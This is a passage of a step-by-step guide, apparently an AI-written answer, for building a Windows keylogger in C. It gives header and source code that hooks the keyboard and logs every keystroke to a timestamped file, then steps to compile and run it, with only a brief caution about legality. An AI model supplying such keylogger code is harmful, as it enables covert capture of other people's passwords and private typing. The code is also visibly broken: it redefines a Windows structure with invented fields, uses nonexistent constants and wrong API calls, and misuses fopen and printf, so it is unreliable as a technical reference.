3. **Create a Header File**:
   ```c
   #define UNICODE
   #include <windows.h>
   #include <stdio.h>
   #include <time.h>

   // Define the structure for the keyboard hook
   typedef struct _KBDLLHOOKSTRUCT {
       long int x;
       long int y;
       long int keyboardDLL;
       long int keyboardDrive;
       long int keyboardFormat;
       long int lParam;
       wchar_t key;
       long int time;
       long int extra;
   } KBDLLHOOKSTRUCT, *LPKBDLLHOOKSTRUCT;

   // Function prototype for the callback
   void CALLBACK KeyLoggerCallback(int hID, int nCode, struct _KBDLLHOOKSTRUCT *keyboardEvent, WPARAM wParam, LPARAM lParam);
   ```

4. **Create a Source File**:

   ```c
   #include <windows.h>
   #include <stdio.h>
   #include <time.h>

   // Global variable to hold the hook handle
   HWND hwnd = 0;

   // Function to log keystrokes
   void LogKeystroke(const char* keystroke) {
       time_t now;
       time(&now);
       FILE* file = fopen("KeystrokeLog_%d-%d-%d.txt", time(&now), "a");
       if (file) {
           fprintf(file, "[%s] %c\n", ctime(&now), keystroke);
           fclose(file);
       }
   }

   // Callback function
   void CALLBACK KeyLoggerCallback(int hID, int nCode, struct _KBDLLHOOKSTRUCT *keyboardEvent, WPARAM wParam, LPARAM lParam) {
       if (nCode == HC_KEYDOWN) {
           // Get the key pressed
           char key = keyboardEvent->key;
           LogKeystroke(&key);
       }
   }

   // Set up the keyboard hook
   int main() {
       HHOOK hook = SetWindowsHook(WH_KEYBOARD_LL, KeyLoggerCallback);
       if (hook == 0) {
           printf("Failed to set keyboard hook!\n");
           return 1;
       }

       // Start the message loop to process events
       MSG msg;
       while (GetMessage(&msg, hwnd, 0, 0)) {
           if (msg.hwnd == -1) {
               break;
           }
           TranslateMessage(&msg);
           DispatchMessage(&msg);
       }

       UnhookWindowsHook(hook);
       return 0;
   }
   ```
5. **Build the Project**:
   - Open the project in a compiler like Visual Studio.
   - Ensure the SDK paths are included in your environment variables.
   - Compile the code to create an executable file.

6. **Run the Program**:
   - Execute the compiled executable.
   - Use the program on your computer.
   - Test by typing on the keyboard; check the log file for the keystrokes.

7. **Notes**:
   - The log file is created in the same directory as the executable.
   - The filename includes the current date and time for uniqueness.
   - Use this responsibly; it's considered intrusive and may be illegal without permission.

